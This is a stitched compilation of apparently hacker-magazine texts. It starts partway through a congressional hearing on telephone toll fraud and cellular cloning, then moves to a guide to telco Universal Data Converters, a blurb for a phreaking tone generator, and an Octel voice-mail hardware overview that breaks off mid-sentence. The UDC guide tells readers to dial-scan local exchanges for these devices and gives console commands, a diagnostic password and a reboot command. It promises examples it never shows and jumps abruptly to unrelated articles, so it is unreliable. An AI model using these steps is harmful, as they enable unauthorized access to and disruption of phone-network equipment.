start protecting phone calls. The phone companies might make red
boxes harder to use or might make it easier for people to afford
phone calls, but we will never know if we don&#039;t make it public.
     Mr. FIELDS. I want to be honest with you, Mr. Goldstein. I
think it is frightening that someone like you thinks there is a
protected right in invading someone else&#039;s privacy.
     Mr. Guidry, let me turn to you. How does a hacker get the
codes that you were talking about a moment ago -- if I understood
what you were saying correctly, the manual ID number, the other
cellular numbers that allow them to clone?
     Mr. GUIDRY. Well, unfortunately, &quot;2600&quot; would be a real good
bet to get those, and we have arrested people and found those
manuals in their possession.
     The other way is quite simply just to what we call dumpster
dive, and that is to go to cellular carriers where they may destroy
trash. Unfortunately, some of it is shredded and put back together,
some of it is not shredded, and kids, criminals, go into those
dumpsters, withdraw that information, piece it together, and then
experiment with it. That information then is usually sold for
criminal activity to avoid prosecution.
     Mr. FIELDS. You are asking the subcommittee to include
wireless and cellular, and I think that is a good recommendation.
I think certainly that is one that we are going to take as good
counsel. But it appears that much of what you are talking about is
organized activity, and my question is, does the current punishment
scheme actually fit the crime, or should we also look at increasing
punishment for this type of crime?
     Mr. GUIDRY. I would strongly suggest that we increase the
punishment for this sort of crime. It is unfortunate that some
hackers take that information and sell it for criminal activity,
and, as a result, if prosecution is not stiff enough, then it far
outweighs the crime.
     Mr. FIELDS. What is the punishment now for this type of
cellular fraud?
     Mr. GUIDRY. Right now, it can be as high as $100,000 and up to
20 years in the penitentiary.
     Mr. FIELDS. Mr. Delaney, do you feel that that is adequate?
     Mr. DELANEY. Under New York State law, which is what I deal
with, as opposed to the Federal law, we can charge a host of
felonies with regard to one illicit telephone call if you want to
be creative with the law. Sections 1029 and 1039 really cover just
about everything other than the cellular concern and the wireless
concern.
     However, I think the thing that is not dealt with is the
person who is running the call sell operations. The call selling
operations are the biggest loss of revenue to the telephone
companies, cellular companies. Whether they are using PBX&#039;s or call
diverters or cellular phones, this is where all the fraud is coming
from, and there is only a handful of people who are originating
this crime.
     We have targeted these people in New York City right now, and
the same thing is being done in Los Angeles and Florida, to
determine who these people are that use just the telephone to hack
out the codes on PBX&#039;s, use ESN readers made by the Curtis Company
to steal the ESN and MIN&#039;s out of the air and then to disseminate
this to the street phones and to the cellular phones that are in
cars and deprive the cellular industry of about $300 million a
year, and the rest of the telecommunications networks in the United
States probably of about $1 billion a year, due to the call sell
operations.
     In one particular case that we watched, as a code was hacked
out on a PBX in a company in Massachusetts, the code was
disseminated to 250 street phones within the period of a week. By
the end of the month, a rather small bill of $40,000 was sent to
the company, small only because they were limited by the number of
telephone lines going through that company. Had it been a larger
company whose code had been cracked by the finger hacker, the bill
would have been in the hundreds of thousands of dollars, or over $1
million as typically some of the bills have been.
     But this is a relatively small group of people creating a
tremendous problem in the United States, and a law specifically
dealing with a person who is operating as an entrepreneur, running
a call selling operation, I think would go far to ending one of the
biggest problems we have.
     Mr. FIELDS. Let me ask so I understand, Mr. Delaney and Mr.
Guidry, because I am a little confused, or maybe I just didn&#039;t
understand the testimony, are these individual hackers acting
separately, or are these people operating within a network, within
an organization?
     Mr. DELANEY. These finger hackers are the people that control
the network of people that operate telephone booths and cellular
phones for reselling telephone service. These finger hackers are
not computer hackers.
     Mr. FIELDS. When you say finger hackers, is this one person
operating independently, or is that finger hacker operating in
concert --
     Mr. GUIDRY. No. He has franchised. He has franchised out. He
actually sells the computer and the software and the cattail to do
this to other people, and then they start their own little group.
Now it is going internationally.
     Mr. FIELDS. Explain to me, if the chairman would permit --
     Mr. MARKEY. Please.
     Mr. FIELDS. Explain to me the franchise.
     Mr. GUIDRY. What happens is, let&#039;s pretend we are in Los
Angeles right now and I have the ability to clone a phone that is
using a computer, a cattail, we call it, that goes from the
computer, the back of the computer, into the telephone, and I have
the diskette that tells me how to change that program. I can at
some point sell the cloning. You can come to me, and I can clone
your phone.
     However, that is one way for me to make money. The best way
for me to make money is to buy computers, additional diskettes, and
go to Radio Shack or some place and make additional cattails and
say, &quot;I can either clone your phone for $1,500, or what you can do
for $5,000 is start your own company.&quot; So you say, &quot;Well, wow,
that&#039;s pretty good, because how many times would I have to sell one
phone at from $500 to $1,500 to get my initial investment back?&quot; As
a result now, you have groups, you have just youngsters as well as
organized crime stepping in.
     The Guidry Group has worked in the Philippines on this, we
have worked in Mexico, the Dominican Republic, Chile, Argentina,
and next week I will be in London and in Rome. It is so bad, sir,
that now intelligence agencies in Rome have told me -- and that is
what I am going there for -- that organized crime seems to think
that telecommunications fraud is more lucrative, unfortunately,
than drugs, and it is darned sure more lucrative in the Los
Angeles, probably New York, and Miami areas, because right now
prosecution is not that strong. It is unfortunate that all of law
enforcement is not trained, nor could they be, to pick up on
someone standing on a corner using an illegitimate phone.
     Mr. FIELDS. How would a person know where to get their
telephone cloned?
     Mr. GUIDRY. Let me tell you what happens. Normally when we go
into a major metropolitan city, or we also check the computer
bulletin boards, a lot of times that information is there. Most of
the time, though, it is in magazines, like green sheets, which are
free advertisements saying, &quot;Call anywhere in the world. Come to --&quot;
a location, or, &quot;Call this number.&quot; Also in Los Angeles, for some
reason, they seem to advertise a lot in sex magazines, and people
will simply buy a sex magazine and there will be a statement in
there, &quot;Earn money the fast way. Start your own telecommunications
company.&quot; And then we will follow up on that tip and work with the
Secret Service to try to apprehend those people.
     Mr. FIELDS. Mr. Haugh.
     Mr. HAUGH. If I could just add a few comments, it would be
most unfortunate if this denigrates into a discussion of
adolescents who are curious and so-called finger hackers. The truth
of the matter is that the toll fraudsters are adults, they are
organized, they are smart, they are savvy, and the drug dealers in
particular are learning very quickly that it is far more lucrative,
far less dangerous, to go into the telecom crime business.
     &quot;Finger hacking&quot; is a term, but the truth is, war dialers,
speed dialers, modems, automated equipment now will hack and crack
into systems and break the codes overnight. While the criminal
sleeps, his equipment penetrates those systems. He gets up in the
morning, and he has got a print sheet of new numbers that his
equipment penetrated overnight.
     We have interviewed the criminals involved. These so-called
idle curiosity adolescents are being paid up to $10,000 a month for
new codes. I don&#039;t call that curiosity, I call that venality. We
are talking a $4 billion problem.
     The chairman came up with the Maple Street example. I think
even better yet, Mr. Chairman, the truth is that 216 Maple had a
security device on the door and a code, and what Mr. Goldstein and
his ilk do is sell that code through selling subscriptions to these
periodicals. There is a big difference, in my opinion, between
saying, &quot;216 Maple is open&quot; -- that is bad enough -- than to say,
&quot;You go to 216 Maple, and push 4156, and you can get in the door.&quot;
     But we are talking about crime, we are talking about adults,
we are talking about organized crime, perhaps not in the Cosa
Nostra sense, but even the Cosa Nostra is wising up that they can
finance some of these operations, and in New York and Los Angeles,
in particular, the true Mafia is now beginning to finance some of
these telecom fraud operations.
     Mr. FIELDS. Mr. Guidry, one last question. Is it the Secret
Service that is at the forefront of Federal activity?
     Mr. GUIDRY. Yes, sir, it is.
     Mr. FIELDS. Do they have the resources to adequately deal with
this problem?
     Mr. GUIDRY. No, sir. The problem is growing so rapidly that
they are undermanned in this area but have asked for additional
manpower.
     Mr. FIELDS. Is this a priority for the Secret Service?
     Mr. GUIDRY. Yes, sir, it is.
     Mr. FIELDS. Thank you, Mr Chairman.
     Mr. MARKEY. The gentleman&#039;s time has expired.
     Again, it is a $4 to $5 billion problem.
     Mr. HAUGH. That is what our research indicated.
     Mr. MARKEY. There were 35,000 victims last year alone.
     Mr. HAUGH. Yes, sir, and this is only users, large users. Now
it can be businesses, nonprofits. There is a university on the East
Coast that just this last week got hit for $490,000, and the fraud
is continuing.
     Mr. MARKEY. The gentleman from Ohio.
     Mr. OXLEY. Thank you, Mr. Chairman.
     Let me ask the witnesses: Other than making the penalties
tougher for this type of activity, what other recommendations, if
any, would any of you have that we could deal with, that our
subcommittee should look at, and the Judiciary Committee, I assume,
for what we might want to try to accomplish?
     Mr. Haugh?
     Mr. HAUGH. I happen to disagree with a couple of the witnesses
who have indicated tougher penalties. I mean it sounds great. You
know, that is the common instant reaction to anything, expand the
penalties. I happen to think 20 years is plenty enough for criminal
penetration of a telecom system, and there are a few housekeeping
things that could be done.
     The problem isn&#039;t the adequacy of the law, the laws are pretty
adequate, and, as Mr. Delaney indicated, you have a violation
someplace, you have got a State law and a Federal law, both, and if
you are a smart prosecutor, there are about eight different ways
you can go after these criminals.
     The truth is, we have got inadequate enforcement, inadequate
funding, inadequate pressure on the part of the Congress on the FCC
to make more proactive efforts and to put more heat on the industry
to coordinate.
     The truth is that the carriers compete with each other
fiercely. They, with some limited exceptions, don&#039;t share
appropriate information with each other. The LEC&#039;s and the RBOC&#039;s
hide behind privacy; they hide behind other excuses not to
cooperate with law enforcement and with the rest of the industry as
effectively as they should.
     So I think putting the heat on the industry, putting the heat
on the FCC, more adequately funding the FCC, more adequately
funding the Secret Service, and having hearings like this that
focus on the problem is the answer and not expanding the penalty
from 20 years to 25 years. Nobody gets 20 years anyway, so
expanding the 20 years is, to me, not the answer.
     Mr. OXLEY. What is the average sentence for something like
that?
     Mr. HAUGH. I think the average toll fraud criminal who
actually goes to jail -- and they are few and far between -- spends
3 to 6 months, and they are out.
     Now recidivism levels are low, I agree with Mr. Delaney. Once
you catch them, they rarely go back to it. So it isn&#039;t a question
of putting them in jail forever, it is a question of putting them
in jail. The certainty of punishment level is very low.
     We talked to a drug dealer in New York City who left the drug
business to go into toll fraud because he told me he can make
$900,000 a year -- nontaxable income, he called it -- and never
ever worry about going to jail.
     Mr. DELANEY. In New York City, I have never seen anybody go to
jail on a first offense for anything short of armed robbery, let
alone telephone fraud. They typically get 200 hours of community
service, depending upon the judge.
     These people that I am speaking about are not the computer
hackers that we were speaking about earlier, these are the people
that are the finger hackers that break into the PBX&#039;s around the
country. These are immigrants in the United States, they are
adults, they know how to operate a telephone. They sit there
generally -- almost every one that we have arrested so far uses a
Panasonic memory telephone, and they sit there night and day try
ing to hack out the PBX codes. They go through all the default
codes of the major manufacturers of PBX&#039;s. They know that much.
     We don&#039;t have a single person in New York City, that I know
of, that is hacking PBX&#039;s with a computer. The long distance
carriers can see patterns of hacking into 800 lines, which are
typically the PBX&#039;s, and they can see that it is being done by
telephone, by finger hacking a telephone key pad, as opposed to a
computer.
     The war dialing programs that Mr. Haugh referred to are
typically used by the computer hackers to get these codes, but they
create only a minuscule amount of the fraud that is ongoing in the
country. The great majority is generated by the finger hackers who
then disseminate those codes to the telephone booths and the call
selling operations that operate out of apartments in New York City.
In one apartment with five telephones in it that operates 16 hours
a day for 365 days a year selling telephone service at $10 for 20
minutes, you take in $985,000. It is a very profitable business.
     One of the individuals we arrested that said he did this
because it was more profitable and less likely that he be caught
than in selling drugs was murdered several months after we arrested
him in the Colombian section of Queens because he was operating as
an independent. It is a very controlled situation in New York City,
and different ethnicities throughout New York City control the call
sell operations in their neighborhoods, and everyone in those
neighborhoods knows where they can go to make an illicit phone call
or to get a phone cloned, whether it is a reprogrammed phone or
rechipped.
     Mr. OXLEY. Mr. Guidry, did you have a comment?
     Mr. GUIDRY. Well, I think that we really do need to enforce
the laws and we need to make some statutory changes in title 18,
section 1029 to include cellular and wireless.
     I have been in courtrooms where really savvy defense attorneys
say, &quot;Well, it does not specifically indicate cellular or
wireless,&quot; and that raises some question in the jury&#039;s mind, and I
would just as soon that question not be there.
     Mr. OXLEY. Thank you.
     Mr. Chairman, I see we have got a vote, and I yield back the
balance of my time.
     Mr. MARKEY. Thank you.
     We are going to have each one of you make a very brief summary
statement to the committee if you could, and then we are going to
adjourn the hearing.
     As you know, the Federal Communications Commission will be
testifying before this subcommittee next week. We have a great
concern that, although they held an all-day hearing on toll fraud
last October, while we thought they were going to move ahead in an
expeditious fashion, that, with a lot of good information, it has
all sat on the shelf since that time. We expected them to act on
that information to establish new rules protecting consumers and
pushing carriers to do a lot more than they have done thus far to
protect their networks. In light of recent court decisions holding
that consumers are always liable I think that action by the FCC is
long overdue, and at the FCC authorization hearing next week I
expect to explore this issue with the commissioners in depth, so
you can be sure of that, Mr. Haugh.
     Let&#039;s give each of you a 1-minute summation. Again, we will go
in reverse order and begin with you, Mr. Guidry.
     Mr. GUIDRY. Thank you, sir.
     Telecommunications fraud, of course, is going internationally,
and as it goes internationally and starts to franchise and get more
organized, we are going to have to figure out a better way to
combat it. Industry itself right now is putting its best foot
forward. However, I would ask this committee to strongly look at
changing some of this legislation and to also increase law
enforcement&#039;s efforts through manpower.
     Thank you very much, sir.
     Mr. MARKEY. Thank you.
     Mr. Haugh.
     Mr. HAUGH. I agree with Mr. Guidry that there are some
housekeeping changes that need to be made, and the particular title
and section he referred to should definitely be amended to include
more clearly wireless.
     The overall problem is an immense one; it is a very serious
one; it is a complicated one. Everybody is at fault. Finger
pointing has been carried to an extreme. Again, I think the long
distance carriers, the big three -- AT&amp;T, MCI, and Sprint -- have
done a superb job of coming up to speed with monitoring. They are
starting to cooperate better. They have really come to the table.
     The laggards are the LEC&#039;s and the RBOC&#039;s, the CPE
manufacturers, and the FCC. In fairness to the FCC, they are
understaffed, undermanned, underfunded. They can&#039;t even take care
of all their mandated responsibilities right now, let alone take on
new chores.
     All that said, there is a great deal the FCC can do --
jawboning, regulations, pushing the LEC&#039;s and the RBOC&#039;s, in
particular, to get real, get serious -- and I would urge this
committee -- applaud your efforts and urge you to continue that.
     Mr. MARKEY. Thank you.
     Dr. Tippett.
     Mr. TIPPETT. Thank you.
     The computer virus issue is a little bit different than the
toll fraud issue. In fact, there are no significant laws that deal
with viruses, and, in fact, the fact that there are no laws gives
the people who write viruses license to write them. The typical
statement you read is, &quot;It&#039;s not illegal, and I don&#039;t do anything
that is illegal.&quot; So in the computer virus arena we do need laws.
They don&#039;t need to be fancy; they don&#039;t need to be extensive. There
are some suggestions of approaches to virus legislation in my
written testimony.
     We also need education, and I would encourage Congress to
underwrite some education efforts that the private sector could
perform in various ways, perhaps through tax incentives or tax
credits. The problem is growing and large. It exceeds $1 billion
already in the United States, and it is going to be a $2 billion
problem in 1994.
     As bad as toll fraud seems, this virus issue is, oddly, more
pervasive and less interesting to a whole lot of people, and I
think it needs some higher attention.
     Mr. MARKEY. Thank you.
     Mr. Goldstein.
     Mr. GOLDSTEIN. Thank you.
     I would like to close by cautioning the subcommittee and all
of us not to mix up these two very distinct worlds we are talking
about, the world of the criminal and the world of the experimenter,
the person that is seeking to learn. To do so will be to create a
society where people are afraid to experiment and try variations on
a theme because they might be committing some kind of a crime, and
at the same time further legislation could have the effect of not
really doing much for drug dealers and gangsters, who are doing far
more serious crimes than making free phone calls, and it is not
likely to intimidate them very much.
     I think the answer is for all of us to understand specifically
what the weaknesses in the technology are and to figure out ways to
keep it as strong and fortress-like as possible. I do think it is
possible with as much research as we can put into it.
     Thank you.
     Mr. MARKEY. Thank you, Mr. Goldstein.
     Mr. Delaney.
     Mr. DELANEY. Last year, the Secret Service and the FBI
arrested people in New York City for conducting illegal wiretaps.
The ability to still do that by a hacker exists in the United
States. Concerned with privacy, I am very happy to see that
something like the Clipper chip is going to become available to
protect society. I do hope, though, that we will always have for
the necessary law enforcement investigation the ability to conduct
those wiretaps. Without it, I see chaos.
     But with respect to the cellular losses, the industry is
coming along a very rapid rate with technology to save them money
in the future, because with encryption nobody will be able to steal
their signals either.
     Mr. MARKEY. Thank you, Mr. Delaney.
     I apologize. There is a roll call on the Floor, and I only
have 3 minutes to get over there to make it. You have all been very
helpful to us here today. It is a very tough balancing act, but we
are going to be moving aggressively in this area. And we are going
to need all of you to stay close to us so that we pass legislation
that makes sense.
     This hearing is adjourned. Thank you.
     [Whereupon, at 12:16 p.m., the subcommittee was adjourned.]

                       &quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;

What IS a UDC?!
&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;

The Universal Data converter (UDC), by Applied Computing Devices,
was put into widespread use in 1979.  A UDC is used primarily in
connection with a variety of switches, to log everything the switch does,
and report it to the Central Office in a standard format, allowing the
monitoring and reporting of a variety of different switches by one processor
without the need of understanding each individual switch. This lets the
Telco-Trouble shooters monitor exactly how much traffic is passing
thru a given switch.  Exact number of calls, busys &amp; fraud attempts, are
some examples.  A UDC will give detailed reports of such activity, as
well as hold it in a buffer file which you can view for your own excitement.
The real purpose of this piece of hardware is to buffer data, convert it
to a standard format, and send it on it&#039;s merry way to the Central Processor.
Information may be buffered for up to an hour, before being able to be
received by the Central Processor.

Which Switches use a UDC?
&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;

Well, apparently, nearly all switches owned by a tel-co use a UDC
for their daily reports.  Here is a list of the switches of which I know
may be connected to a converter:


       At&amp;t Autoplex 100
       ITT/North 1210
       ITT/North NX-1E
       ITT/North &quot;1200&quot; Series (DSS-1)
       GTE GTD-1 (Automatic Electric no. 1 EAX)
       GTE GTD-2 (Automatic Electric no. 2 EAX)
       GTE GTD-3 (Automatic Electric no. 3 EAX)
       GTE GTD-5
       Motorola EMX-250
       NEC NEAX-61
       NEC ND-20S
       Northern Telecom DMS-10
       Northern Telecom DMS-100
       Northern Telecom DMS-200
       Northern Telecom DMS-250
       Northern Telecom DMS-300
       Northern Telecom SL-1  (Seen these around locally)
       Northern Telecom SP-1 PABX
       Stromberg Carlson DCO
       TRW Vidar ITS-4
       TRW Vidar ITS-4/5
       TRW Vidar ITS-5
       Western Electric 5 ESS
       GTE PBX&#039;s (GTD-1000, GTD-4600)



General Configurations:
&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;

A UDC may be configured in several ways.  A UDC consists of up to 6 ports.
Port 0 is usually a dialin line, in which it is connected to a 300/1200
baud modem, so that GTE employees may call to check their switch
information in the field.

Port 0 may also be a dedicated line, which is linked to a computer somewhere
important, but if this is the case, you can&#039;t have found it anyways, so don&#039;t
worry about it. (Unless of course you another indial port possibly 1)

Port 2 is usually the line which is hardwired to the data output of the
switch.  This port receives the messages of a switch, analyses the data,
buffers it, and waits until it is told to send the data to the CP, which
may be every time the buffer flips, which of course is configured by hardware.
It is not required that port 2 be the hardwire, although it is just the
most common configuration.

Port 1 &amp; 3-7 are also multi-use ports , which may be configured
either for a dedicated line, or a standard phone line, just like port 1.
The difference between this port and port 0 however, is that this port may
also be used to test lines other than the hardware set report line #.
(More later.)

NOTE:  ANY of these ports can be completely different depending on the
       setup of the UDC&#039;s cards, and which slot they are in...


The UDC can be configured (though I have never seen it this way) so that any
of the six ports can preform the functions instead of the first three.
If you find a UDC, be sure to check all the ports, and not just three.

The general idea of this box of tin is that it will monitor any
switch, collect data into a buffer, and store it until it need be
converted and polled by the SAC.  When the data is sent out, it is sent
in standard UDC format, regardless of the type of switch, therefore any
switch may be monitored by the SAC without having to be converted on
the spot.

Yeah Great what the ?#!$ do I do?
&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&#039;

Scan your local area for all numbers ending in 99xx or 00xx, often
(with GTE anyways) the prefix may be something like 446-9988, or something
outright obvious.  Once you find one, you will know, because you will
get one of two things.  Depending on the configuration of the UDC,
you will either begin getting a dump of data, which will go into detail
about the switch information, or you will get a prompt:

*B*&gt;

When you receive this prompt, you can make your life easy by typing
HELP in all caps, for a menu of commands, which will seem important at
first (don&#039;t fool yourself).

Each letter between *&#039;s represents a separate processor (yes even this tin
box has more than one!  These letters will be in the menu
when you type HELP.  To change processors, you will need to hold control
while pressing the letter of the processor you wish to change to.

Here is a list of commands for each processor:

                        The Basic processor
                        ~~~~~~~~~~~~~~~~~~~

*B*&gt; DATE               Display the system Date

*B*&gt; DATE mm/dd/yy      Set the date to mm/dd/yy

*B*&gt; DIAGNOSTIC         This puts you in debug mode for the UDC&#039;s program
                        When typing this command the UDC will respond with
                        &quot;PASSWORD&quot; and will not echo letters.  If the password
                        given is correct, you will get a prompt like this:
                        *B*&gt; DIAG
                        PASSWORD 305      &gt; I enter the good password&lt;
                        DEBUG 1,3         &gt; 1,3 are the ports in use &lt;
                        ?
                        At this point you can reboot the UDC by typing:
                        ? G
                        (ADDR)=1000       &gt; I tell it to jmp to 1000 &lt;
                        Then all hell will break loose...trust me!
                        O.k. well it will look like it anyway...

What is all this?
~~~~~~~~~~~~~~~~

The RMT data is the data transmitted to the UDC by the switch.  This data
is formatted in such a way that it tells the UDC what is happening and what
has already happened since the last buffer flip.  This data is then converted
to a standard format to be transferred to the Central Processor.  For examples
of switch output, refer to the switch example list further in this article.

Here is an example of the System Output data, after being translated into
standard format by the UDC:


The first two lines of the System Output data will contain the values
of the 19 status registers as follows:

       0     1     2     3     4     5     6     7     8     9

The registers are as follows:

0       UDC control program number (usually 345, newer versions may be diff.)
1       UDC control program version (1,3,5,etc.)
2       Hour at buffer flip (active to passive)
3       Minute at buffer flip (active to passive)
4       Number of buffer flips since power on (65535 maximum)
5       Power interrupt flag (99 if fewer than two intervals have occurred
        since the power interrupt or hard restart; 0 otherwise)
6       Number of reports in the buffer
7       Total number of meters in this buffer (including headers)
8       Hour at buffer flip (passive to active)
9       Minute at buffer flip (passive to active)
10-13   Strapping Card signature
14      Total number of errors since last had reset or power up
15      Number of soft restarts since last power-up or hard restart
16      Number of buffer flips since last soft restart
17      Address of last error which caused a soft restart
18-19   unused


When a traffic report is to be sent, the following header will be sent
(in the System Output) to the UDC processor(s) to tell the traffic processor
to begin buffering the report:

       0     1     2     3     4     5     6     7     8     9

190  65535 00008 00022 00000 00000 00000 00000 00000 00000 00000
191  00004 00027 00078 00700 00800 31227 00074 00000 00002 00018
192  00078 00000 00000 00000 00000 00000 00000 00000 00000 00000

       10    11    12    13    14    15    16    17    18    19

The registers for the header are as follows:

0       65535 (This signals the beginning of the switch report)
1       Message type obtained from the &#039;type&#039; field of the RMT
2       The number of registers used by the message, including the
        10 registers of this header.
3-9     unused (00000)



Ok ?!  Now what?!
~~~~~~~~~~~~~~~~~

Well now that I have explained all the commands, the data formats, etc,
of the UDC, you can now check the RMT or TRAFFIC buffers to see exactly
what type of switch you are monitoring.  Here are some examples of the
Data format for the following switches:

BOX.EXE - Submitted to Phrack Magazine for your amusement.
 
by The Fixer / 604
 
This is a tiny, minimalist demonstration of several types of box tones.
No cosmetic bullshit, no command line parameters and no config files.
 
You just type BOX.
 
The only requirements for this program are an IBM PC or compatible and
an Adlib Music Card or one of its many successors (including all Sound
Blaster types).  You may need to turn the volume up a bit as the pure
sinewaves tend to be quieter than other Adlib waveforms.
 
There are keystroke menus in the program.  If you need more help than
that, you shouldn&#039;t be running it.

                           AN INTRODUCTION TO OCTELS
                      AUTOMATIC SPEECH EXCHANGE NETWORK
                                BY OPTIK NERVE
                              (nerve@netaxs.com)


The Automatic SPeech Exchange Network, or ASPEN for short, is a high
performance voice processing system which interfaces and integrates with a
variety of PBX and Central Office (CO) equipment. Interfaced systems require
the caller to enter an extension, while integration provides a personal
greeting automatically. Both of these provide the ability to return to the
operator if necessary. ASPEN systems offer voice mail, Information Center
Mail-Boxes (ICMB), Enhanced Call Processing (ECP), networking, and
transaction processing. The Aspen, Branch, Branch XP, and VPC 100 hardware
is only significantly different in their port and drive capacities. The
following information is presented to introduce an overview of the hardware
in an ASPEN system, and its function for it as a whole. This is not a
&quot;how-to&quot; file and you will not find anything related to fraud in this
article.


SYSTEM COMPONENTS LIST
-=-=-=-=-=-=-=-=-=-=-=-

Each ASPEN system contains the main cardcage, the I/O cardcage, the drives,
power supplies, and the system manager terminal. The system manager printer
is optional. ASPEN hardware consists of:

    o  CPU Board
    o  File card
    o  Line board
    o  Telephone Interface Card (TIC)
    o  Scanner board
    o  Winchester drives
    o  Power supplies
    o  System manager terminal
    o  System manager printer (optional)

The cardcages of the system contain the following boards, each identifiable
by a unique color coded tab indicating the slot into which the board fits.

 MAIN CARDCAGE

    o  CPU (yellow)
    o  File card (dark green)
    o  Line boards (light green)

 INPUT/OUTPUT CARDCAGE

    o  Scanner board (pink)
    o  TICs (purple)


SYSTEM COMPONENTS OVERVIEW
-=-=-=-=-=-=-=-=-=-=-=-=-=-

The following subsections present a functional description of the
characteristics considered standard on ASPEN system hardware.


CENTRAL PROCESSING UNIT
~~~~~~~~~~~~~~~~~~~~~~~
The CPU board contains a microprocessor with access to one megabyte of
RAM. It is identical, in function, to a personal computers&#039; CPU,
executing instructions, and controlling serial I/O to the scanner board
and system manager terminal.

SYSTEM DATA BUSES
~~~~~~~~~~~~~~~~~
System communication between the boards uses three main buses: the control
bus, the data bus, and the polling/status bus. The eight megahertz control bus
works on a request/response procotol; for each 16 byte message sent by the
CPU to a board, a 16 byte response must be sent back to the CPU. The data bus
moves large amounts of data (20KB transfers) between the CPU, file card, and
line boards at eight megahertz. All digitized speech to and from the line
boards and file card travel on this bus. The polling/status control bus is
used only between the scanner board and TICs. The scanner board polls each TIC
port for an on-hook/off-hook status every ten milliseconds.

FILE CARD
~~~~~~~~~
The file card controls the drives and is the primary system file manager.
The file card controls the Winchester ST-506 interface. The file card also
stores frequently used prompts of less than three seconds in a speech cache
memory.

LINE BOARD
~~~~~~~~~~
The line board contains microprocessors with access to 128KB of RAM. The
line board has four channels, each matching a channel on a TIC. The Aspen may
contain as many as six line boards, but this is limited to four, and even
two on lower end Aspen models. Line boards perform several important
functions including: encoding and decoding of digitized speech, tone
detection, DTMF detection, silence detection, speed control, and DTMF tone
generation. Speech is encoded at a rate of 25K samples per second using Delta
modulation. Each of the four channels on the line board has a tone detection
circuit, which detects dial, busy, reorder, and ringback tones generated by
most PBXs and COs. The proprietary design limits talk-off during message
playback.  Talk-off may occur when the voice generates tones similar to DTMF
tones.  Silence detection recognizes spaces between words so that the voice
message can be compressed for disk storage, optimizing disk space. The
system also recognizes silence during message recording and prompts the user
to continue.  The line board controls message playback speed without
affecting voice frequency pitch by controlling the amount of silence
between words.  Playback can be normal, slow, or fast. The line board is
equipped with a tone generator used for dialing when ASPEN places an
outcall or transfers a call.

TELEPHONE INTERFACE CARDS
~~~~~~~~~~~~~~~~~~~~~~~~~
The Telephone Interface Cards (TICs) provide interfaces to either the
Public Switched Telephone Network (PSTN) including CO, or to a PBX. In
most installations, the TIC emulates a regular telephone to the PBX or the
CO.  Octel Communications has special TICs that emulate electronic digital
sets in a Mitel PBX and ROLM PBX. The four channels on a TIC connect
directly to the four channels on a line board. The TICs use transformers to
provide electrical isolation to protect the line board and the network or PBX.
The TICs communicate with the scanner board through the polling/status
control bus located on the I/O backplane.

SCANNER BOARD
~~~~~~~~~~~~~
The scanner board, as mentioned above,  communicates with all TICs through
the polling/status control bus. By continually polling all TIC channels, the
scanner board detects new incoming calls and reports this change in status
information to the CPU board though one of the four serial I/O ports. It also
provides RS-232 data connection to the PBX when required, and the serial I/O
port which interfaces the system managers terminal with the CPU. The scanner
board includes a built in modem used to remotely access the system
administration functions. The local system manager terminal and the modem
circuit share the same serial I/O port, and the first connection has priority
over the second. (ie: If the modem is connected, the local system manager
terminal cannot access the system)

SYSTEM MANAGER TERMINAL/PRINTER
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
The system manager terminal is used to enter and change information within
the system database. The system manager terminal is a Wyse 50 terminal
used by ASPEN to report administrative information. The printer is an
optional device used to produce a hard copy of output produced.

DISK COMMUNICATOR
~~~~~~~~~~~~~~~~~
The Disk Communicator provides connections between the file card and the
drives. If more than four drives are installed, a multiplexer (MUX)
communicator board selects the four drives in the first cabinet and the
four drives in the second cabinet.

WINCHESTER DRIVES
~~~~~~~~~~~~~~~~~
These drives store system software, mailboxes, voice prompts, messages, and
greetings. Octel Communications uses its own formatting technique and disk
controllers. Standard drives are formatted for a capacity of 60, 90, or 190
megabytes. The drives (0-1) contains all software and voice prompts needed to
operate the system.

POWER SUPPLY
~~~~~~~~~~~~
The ASPEN power supply is located in the center of the system housed in a
single case, which actually contains two supplies. One supplies +5/-5 and
+12/-12 volts to the boards, while the other provides +12 volts for the
drive motors. There are no replaceable fuses in an ASPEN system. If the
current draw or input voltage reaches a defined level, the power supply
turns itself off automatically, necessitating a reset of a single circuit
breaker.

SPECIAL INTEGRATION DEVICES
~~~~~~~~~~~~~~~~~~~~~~~~~~~
The Woobox and the PBX Integration Device (PID) provide integration to
different PBXs. These devices stand alone and are peripheral to the ASPEN
chassis. ASPEN integrates with the AT&amp;T Systems 75 and 85 using an A/PID.


THE CALL PROCESS
-=-=-=-=-=-=-=-=-

The following is a general description of a typical call through ASPEN and
the boards involved in the process:

  o  Subscriber dials the ASPEN pilot number, either directly or is
     forwarded to APSEN by the PBX.
  o  A TIC senses ring voltage and raises a flag to indicate an
     incoming call.
  o  The scanner board polls all TICs for change of status using the
     polling/status control bus and detects the raised flag.
  o  The scanner board commands the TIC to answer the call (go off-hook)
     by sending a command on the polling/status control bus
  o  The scanner board alerts the CPU board of an incoming call
     by sending port identification information over the serial
     I/O port.
  o  The CPU commands the corresponding port on the line board to
     begin listening for DTMF tones, silence, or dial tone. The line
     board informs the CPU of call process through the control bus.
  o  The CPU commands the file card to send digitized voice prompts,
     &quot;Hello, this is ASPEN...&quot;, over the data bus to the proper
     port on the line board. The line board converts these prompts
     to analog and passes them to the TIC
  o  The caller dials the desired destination number through DTMF.
     The line board interprets these and passes the information
     to the CPU.
  o  The CPU instructs the file card to find the user record of the called
     party, check for the location of the personal greeting, retrieve the
     greeting, and pass it to the line board. The line board converts the
     greeting to analog and passes it to the TIC
  o  After the greeting plays, the caller records a message. The line board
